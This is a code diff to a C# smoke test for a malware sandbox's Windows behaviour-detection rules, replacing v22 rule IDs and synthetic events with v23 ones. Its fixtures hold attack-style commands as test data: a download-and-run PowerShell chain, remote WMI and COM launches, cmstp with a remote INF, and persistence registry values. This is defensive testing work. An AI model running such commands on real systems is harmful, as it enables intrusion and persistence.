@@ -7,42 +7,28 @@ using KSword.Sandbox.SmokeTests.Framework;
 namespace KSword.Sandbox.SmokeTests.Scenarios;
 
 /// <summary>
-/// Verifies the v22 defensive behavior rule batch for LOLBins, service and
-/// scheduled-task persistence, WMI/WinRM lateral movement, staging,
-/// anti-analysis checks, and download-execute chains without live E2E.
+/// Verifies the v23 high-signal Windows behavior expansion with synthetic
+/// evidence only; no live VM, signing, or heavyweight E2E paths are used.
 /// </summary>
-internal sealed class BehaviorRuleDefensiveMatrixV22Scenario : ISmokeTestScenario
+internal sealed class BehaviorRuleHighSignalWindowsV23Scenario : ISmokeTestScenario
 {
     private static readonly string[] RequiredRuleIds =
     [
-        "lolbin-cmstp-remote-inf-proxy-execution",
-        "lolbin-msbuild-inline-task-user-writable-project",
-        "persistence-service-failurecommand-user-writable",
-        "persistence-scheduled-task-comhandler-user-writable",
-        "lateral-wmi-win32-process-create-remote-host",
-        "lateral-winrm-invoke-command-remote-scriptblock",
-        "staging-archive-extract-script-user-writable",
-        "staging-hidden-script-then-lolbin-launch-correlation",
-        "anti-analysis-debugger-check-exit-gate",
-        "download-execute-iwr-expand-start-chain"
-    ];
-
-    private static readonly string[] RequiredTechniqueIds =
-    [
-        "T1218.003",
-        "T1127.001",
-        "T1543.003",
-        "T1053.005",
-        "T1047",
-        "T1021.006",
-        "T1027",
-        "T1497.001",
-        "T1105"
+        "persistence-time-provider-user-writable-dll",
+        "persistence-netsh-helper-user-writable-dll",
+        "persistence-screensaver-executable-user-writable",
+        "injection-process-doppelganging-transaction-sequence",
+        "injection-process-ghosting-delete-pending-section",
+        "lateral-dcom-excel-application-remote-launch",
+        "lateral-smb-psexesvc-pipe-or-service",
+        "anti-sandbox-human-interaction-gated-exit",
+        "anti-sandbox-vm-service-registry-probe-gate",
+        "download-execute-office-remote-template-launch"
     ];
 
     private static readonly HashSet<string> RequiredRuleIdSet = new(RequiredRuleIds, StringComparer.OrdinalIgnoreCase);
 
-    public string ScenarioId => "behavior.rules-defensive-matrix-v22";
+    public string ScenarioId => "behavior.rules-high-signal-windows-v23";
 
     /// <inheritdoc />
     public Task<SmokeTestResult> RunAsync(SmokeTestContext context, CancellationToken cancellationToken = default)
@@ -56,20 +42,14 @@ internal sealed class BehaviorRuleDefensiveMatrixV22Scenario : ISmokeTestScenari
 
         var rules = RuleEngine.LoadRuleSet(behaviorRulesPath);
         SmokeAssert.True(
-            string.Equals(rules.Version, "2026-07-12-v22-defensive-behavior-expansion", StringComparison.OrdinalIgnoreCase) ||
             string.Equals(rules.Version, "2026-07-12-v23-high-signal-behavior-expansion", StringComparison.OrdinalIgnoreCase),
-            "Behavior rules should carry the v22 defensive behavior expansion version or a newer v23 behavior expansion version.");
+            "Behavior rules should carry the v23 high-signal behavior expansion version.");
 
         var mitreTechniqueIds = ReadMitreTechniqueIds(mitreMapPath);
-        foreach (var techniqueId in RequiredTechniqueIds)
-        {
-            SmokeAssert.True(mitreTechniqueIds.Contains(techniqueId), $"MITRE technique '{techniqueId}' is missing from mitre-windows-map.json.");
-        }
-
         var indexedRules = rules.Rules.ToDictionary(rule => rule.Id, StringComparer.OrdinalIgnoreCase);
         foreach (var ruleId in RequiredRuleIds)
         {
-            SmokeAssert.True(indexedRules.TryGetValue(ruleId, out var rule), $"v22 defensive matrix rule '{ruleId}' is missing.");
+            SmokeAssert.True(indexedRules.TryGetValue(ruleId, out var rule), $"v23 high-signal rule '{ruleId}' is missing.");
             AssertRuleShape(rule!, mitreTechniqueIds);
         }
 
@@ -79,7 +59,7 @@ internal sealed class BehaviorRuleDefensiveMatrixV22Scenario : ISmokeTestScenari
             .ToHashSet(StringComparer.OrdinalIgnoreCase);
         foreach (var ruleId in RequiredRuleIds)
         {
-            SmokeAssert.True(positiveRuleIds.Contains(ruleId), $"Synthetic v22 event should match '{ruleId}'.");
+            SmokeAssert.True(positiveRuleIds.Contains(ruleId), $"Synthetic v23 event should match '{ruleId}'.");
         }
 
         var noiseRuleIds = engine.Classify(CreateNoiseEvents())
@@ -90,13 +70,13 @@ internal sealed class BehaviorRuleDefensiveMatrixV22Scenario : ISmokeTestScenari
             .ToList();
         SmokeAssert.True(
             noiseRuleIds.Count == 0,
-            "Collection/VT/R0/self-noise should not trigger v22 rules: " + string.Join(", ", noiseRuleIds));
+            "Collection/VT/R0/self-noise should not trigger v23 rules: " + string.Join(", ", noiseRuleIds));
 
         return Task.FromResult(new SmokeTestResult
         {
             ScenarioId = ScenarioId,
             Passed = true,
-            Message = $"{RequiredRuleIds.Length} v22 defensive matrix rules match constrained evidence and suppress collection/VT/R0 noise."
+            Message = $"{RequiredRuleIds.Length} v23 high-signal Windows behavior rules match constrained evidence and suppress collection/VT/R0 noise."
         });
     }
 
@@ -124,14 +104,10 @@ internal sealed class BehaviorRuleDefensiveMatrixV22Scenario : ISmokeTestScenari
 
     private static bool HasStrongPredicate(BehaviorRule rule)
     {
-        return rule.AllContainsCommandLine.Count > 0 ||
-            rule.CommandLineRegex.Count > 0 ||
-            rule.AllDataKeys.Count > 0 ||
-            rule.AllDataContains.Count > 0 ||
+        return rule.CommandLineRegex.Count > 0 ||
             rule.DataContainsAll.Count > 0 ||
             rule.DataRegex.Count > 0 ||
-            rule.AllDataRegex.Count > 0 ||
-            rule.AllDataNumericRanges.Count > 0;
+            rule.AllDataRegex.Count > 0;
     }
 
     private static bool ContainsGuard(IReadOnlyDictionary<string, List<string>> guards, string key, string expected)
@@ -146,50 +122,60 @@ internal sealed class BehaviorRuleDefensiveMatrixV22Scenario : ISmokeTestScenari
         [
             new SandboxEvent
             {
-                EventType = "process.start",
-                Source = "guest",
-                ProcessName = "cmstp.exe",
-                CommandLine = @"cmstp.exe /s /au https://download.example.test/profile.inf"
-            },
-            new SandboxEvent
-            {
-                EventType = "process.start",
-                Source = "guest",
-                ProcessName = "MSBuild.exe",
-                CommandLine = @"MSBuild.exe C:\Users\Smoke\Downloads\inline.csproj /t:Build UsingTask CodeTaskFactory"
+                EventType = "registry.set",
+                Source = "driver",
+                Path = @"HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\SmokeProvider\DllName",
+                Data =
+                {
+                    ["path"] = @"HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\SmokeProvider",
+                    ["valueName"] = "DllName",
+                    ["value"] = @"C:\Users\Public\timeprov.dll"
+                }
             },
             new SandboxEvent
             {
                 EventType = "registry.set",
                 Source = "driver",
-                Path = @"HKLM\SYSTEM\CurrentControlSet\Services\SmokeSvc\FailureCommand",
+                Path = @"HKLM\SOFTWARE\Microsoft\NetSh\SmokeHelper",
                 Data =
                 {
-                    ["path"] = @"HKLM\SYSTEM\CurrentControlSet\Services\SmokeSvc\FailureCommand",
-                    ["valueName"] = "FailureCommand",
-                    ["value"] = @"C:\Users\Public\recover.cmd"
+                    ["path"] = @"HKLM\SOFTWARE\Microsoft\NetSh\SmokeHelper",
+                    ["valueName"] = "HelperDll",
+                    ["value"] = @"C:\ProgramData\netshhelper.dll"
                 }
             },
             new SandboxEvent
             {
-                EventType = "scheduled_task.created",
-                Source = "guest",
+                EventType = "registry.set",
+                Source = "driver",
+                Path = @"HKCU\Control Panel\Desktop\SCRNSAVE.EXE",
                 Data =
                 {
-                    ["taskName"] = @"\Smoke\ComHandler",
-                    ["taskAction"] = "ComHandler",
-                    ["handlerPath"] = @"C:\Users\Public\taskhandler.dll"
+                    ["path"] = @"HKCU\Control Panel\Desktop\SCRNSAVE.EXE",
+                    ["valueName"] = "SCRNSAVE.EXE",
+                    ["value"] = @"C:\Users\Smoke\AppData\Roaming\screen.scr"
                 }
             },
             new SandboxEvent
             {
-                EventType = "process.start",
+                EventType = "api.sequence",
                 Source = "guest",
-                ProcessName = "wmic.exe",
-                CommandLine = @"wmic /node:server01 /user:DOMAIN\alice process call create C:\Users\Public\payload.exe",
                 Data =
                 {
-                    ["operation"] = "Win32_Process process call create"
+                    ["operation"] = "CreateTransaction CreateFileTransacted WriteFile CreateSection CreateProcess",
+                    ["targetProcessName"] = "svchost.exe",
+                    ["imagePath"] = @"C:\Users\Public\txpayload.exe"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "process.image",
+                Source = "guest",
+                Data =
+                {
+                    ["operation"] = "delete-pending CreateSection SEC_IMAGE NtCreateProcessEx",
+                    ["imagePath"] = @"C:\Users\Public\ghost.exe",
+                    ["targetProcessName"] = "ghost.exe"
                 }
             },
             new SandboxEvent
@@ -197,28 +183,22 @@ internal sealed class BehaviorRuleDefensiveMatrixV22Scenario : ISmokeTestScenari
                 EventType = "process.start",
                 Source = "guest",
                 ProcessName = "powershell.exe",
-                CommandLine = "powershell.exe Invoke-Command -ComputerName server01 -ScriptBlock { whoami }"
-            },
-            new SandboxEvent
-            {
-                EventType = "artifact.dropped_file.copied",
-                Source = "guest",
+                CommandLine = "powershell.exe [type]::GetTypeFromProgID('Excel.Application','server01')",
                 Data =
                 {
-                    ["archivePath"] = @"C:\Users\Smoke\Downloads\stage.zip",
-                    ["extractedPath"] = @"C:\Users\Smoke\AppData\Local\Temp\stage.ps1"
+                    ["remoteHost"] = "server01",
+                    ["comClass"] = "Excel.Application"
                 }
             },
             new SandboxEvent
             {
-                EventType = "behavior.staging_correlation",
-                Source = "guest",
+                EventType = "pcap.smb",
+                Source = "host",
                 Data =
                 {
-                    ["stagedPath"] = @"C:\Users\Smoke\AppData\Roaming\hidden.js",
-                    ["launcherProcessName"] = "wscript.exe",
-                    ["attributes"] = "hidden archive",
-                    ["correlationId"] = "stage-1"
+                    ["pipeName"] = @"\PIPE\PSEXESVC",
+                    ["serviceName"] = "PSEXESVC",
+                    ["shareName"] = "ADMIN$"
                 }
             },
             new SandboxEvent
@@ -227,20 +207,31 @@ internal sealed class BehaviorRuleDefensiveMatrixV22Scenario : ISmokeTestScenari
                 Source = "guest",
                 Data =
                 {
-                    ["api"] = "IsDebuggerPresent",
-                    ["action"] = "exit"
+                    ["check"] = "GetCursorPos mouse click count",
+                    ["action"] = "exit gate"
                 }
             },
             new SandboxEvent
             {
-                EventType = "process.start",
+                EventType = "anti_sandbox.check",
                 Source = "guest",
-                ProcessName = "powershell.exe",
-                CommandLine = @"powershell.exe Invoke-WebRequest http://example.test/a.zip -OutFile C:\Users\Public\a.zip; Expand-Archive C:\Users\Public\a.zip C:\Users\Public\a; Start-Process C:\Users\Public\a\run.exe",
                 Data =
                 {
-                    ["outputPath"] = @"C:\Users\Public\a.zip",
-                    ["executedPath"] = @"C:\Users\Public\a\run.exe"
+                    ["check"] = "registry service vmware virtualbox",
+                    ["artifact"] = @"HKLM\SYSTEM\CurrentControlSet\Services\VBoxService",
+                    ["action"] = "terminate"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "download.execute",
+                Source = "guest",
+                ProcessName = "winword.exe",
+                CommandLine = "winword.exe https://docs.example.test/template.dotm",
+                Data =
+                {
+                    ["sourceUrl"] = "https://docs.example.test/template.dotm",
+                    ["executedPath"] = @"C:\Users\Smoke\AppData\Local\Temp\upd.exe"
                 }
             }
         ];
@@ -252,43 +243,43 @@ internal sealed class BehaviorRuleDefensiveMatrixV22Scenario : ISmokeTestScenari
         [
             new SandboxEvent
             {
-                EventType = "process.start",
-                Source = "guest",
-                ProcessName = "KSword.Sandbox.Agent.exe",
-                CommandLine = @"cmstp.exe /s /au C:\Users\Public\profile.inf"
-            },
-            new SandboxEvent
-            {
-                EventType = "process.start",
-                Source = "virustotal",
-                ProcessName = "powershell.exe",
-                CommandLine = @"powershell.exe Invoke-Command -ComputerName server01 -ScriptBlock { whoami }",
-                Data =
-                {
-                    ["source"] = "virustotal",
-                    ["vtStatus"] = "not_configured"
-                }
-            },
-            new SandboxEvent
-            {
                 EventType = "registry.set",
                 Source = "r0collector",
-                Path = @"HKLM\SYSTEM\CurrentControlSet\Services\SmokeSvc\FailureCommand",
+                Path = @"HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\SmokeProvider",
                 Data =
                 {
                     ["source"] = "r0collector",
                     ["collectorSelfNoise"] = "true",
-                    ["path"] = @"HKLM\SYSTEM\CurrentControlSet\Services\SmokeSvc\FailureCommand",
-                    ["valueName"] = "FailureCommand",
-                    ["value"] = @"C:\Users\Public\recover.cmd"
+                    ["path"] = @"HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\SmokeProvider",
+                    ["valueName"] = "DllName",
+                    ["value"] = @"C:\Users\Public\timeprov.dll"
                 }
             },
             new SandboxEvent
             {
                 EventType = "process.start",
                 Source = "guest",
-                ProcessName = "msbuild.exe",
-                CommandLine = @"MSBuild.exe C:\src\trusted.csproj /t:Build"
+                ProcessName = "KSword.Sandbox.Agent.exe",
+                CommandLine = "powershell.exe [type]::GetTypeFromProgID('Excel.Application','server01')",
+                Data =
+                {
+                    ["remoteHost"] = "server01",
+                    ["comClass"] = "Excel.Application"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "download.execute",
+                Source = "virustotal",
+                ProcessName = "winword.exe",
+                CommandLine = "winword.exe https://docs.example.test/template.dotm",
+                Data =
+                {
+                    ["source"] = "virustotal",
+                    ["vtStatus"] = "not_configured",
+                    ["sourceUrl"] = "https://docs.example.test/template.dotm",
+                    ["executedPath"] = @"C:\Users\Smoke\AppData\Local\Temp\upd.exe"
+                }
             }
         ];
     }
